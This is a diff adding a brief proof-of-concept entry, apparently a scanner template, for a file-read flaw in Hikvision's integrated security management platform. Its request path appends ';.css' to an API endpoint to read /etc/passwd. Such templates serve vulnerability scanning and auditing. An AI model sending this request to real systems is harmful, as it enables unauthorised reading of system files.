@@ -1,0 +1,3 @@
+name: "海康威视-综合安防管理平台-files-文件读取"
+poc: "/lm/api/files;.css?link=/etc/passwd"
+status_code: 200
